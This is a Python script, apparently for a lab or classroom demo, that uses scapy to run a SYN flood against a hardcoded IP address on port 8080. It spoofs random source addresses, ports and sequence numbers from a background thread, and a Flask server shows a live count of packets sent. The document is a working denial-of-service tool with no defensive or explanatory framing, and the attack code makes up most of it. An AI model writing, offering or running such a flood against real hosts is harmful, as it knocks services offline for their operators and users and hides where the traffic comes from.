#!/bin/env python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import time
import threading

# Global variable to store packet count
packet_count = 0

VM_IP = "153.90.6.209"
WebPagePort = 8080  # Choose an appropriate port number

ip = IP(dst=VM_IP)
tcp = TCP(dport=WebPagePort, flags='S')
pkt = ip/tcp

# Function to send packets and count them
def send_syn_flood():
    global packet_count
    while True:
        pkt[IP].src = str(IPv4Address(getrandbits(32)))
        pkt[TCP].sport = getrandbits(16)
        pkt[TCP].seq = getrandbits(32)
        send(pkt, verbose=0)
        
        packet_count += 1
        time.sleep(0.1)  # Control packet rate (10 packets per second)

# Function to retrieve packet count for the web server
def get_packet_count():
    global packet_count
    return packet_count

# Start the SYN flood in a separate thread to keep the main thread free
flood_thread = threading.Thread(target=send_syn_flood)
flood_thread.daemon = True
flood_thread.start()

# Simple web server
from flask import Flask, jsonify, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/packet_count')
def packet_count_route():
    return jsonify({'count': get_packet_count()})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
